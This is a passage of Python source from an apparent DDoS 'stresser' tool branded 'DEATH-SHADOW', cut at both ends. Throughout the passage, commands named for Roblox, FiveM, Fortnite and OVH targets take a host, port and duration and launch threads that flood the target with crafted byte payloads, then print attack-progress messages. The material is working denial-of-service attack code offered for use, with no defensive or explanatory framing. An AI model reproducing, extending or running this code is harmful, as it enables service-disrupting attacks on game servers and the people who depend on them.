						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-udp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-tcp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-nfokill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "roblox-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-slump":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-nfokill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-roblox":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-fivem":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-fortnite":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
